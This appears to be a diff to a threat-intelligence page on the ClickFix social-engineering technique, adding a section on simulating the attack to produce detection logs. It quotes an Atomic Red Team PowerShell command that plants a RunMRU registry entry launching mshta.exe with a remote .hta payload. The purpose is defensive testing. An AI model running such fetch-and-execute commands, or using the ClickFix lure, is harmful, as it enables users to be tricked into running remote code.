@@ -14,14 +14,18 @@ This page is a deep dive into the Clickfix threat and its variations.
 ## Threat Intelligence
 
 ## Attack Simulation
+We simulate parts of the attack to generate logs for further analysis. There are various options available:
 
+### Atomic Red Team
+The [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) project develops small and highly portable detection tests. They have created a [special test](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md#atomic-test-12---clickfix-campaign---abuse-runmru-to-launch-mshta-via-powershell) for Clickfix as well, where Powershell is used to insert a payload as value for the RunMRU registry key. This simulation focuses on what makes this technique unique only and ignores any other traces a typical attack might leave behind. 
 
-!!! info "Atomic Red Team T1204.002 Test #12 - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell"
-    [Simulates](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md#atomic-test-12---clickfix-campaign---abuse-runmru-to-launch-mshta-via-powershell) a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches mshta.exe with a remote payload.
+***Atomic Red Team: T1204.002 Test #12 - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell:*** *Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches mshta.exe with a remote payload:*
 
-    ``` ps1
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
-    ```
+``` ps1
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
+```
+
+### Simulated Phishing Page
 
 !!! info "Custom ClickFix-like run dialog payload"
     Simulates a user pasting a potentially malicious Powershell command into the Windows run dialog, following a typical ClickFix structure to deceive users.
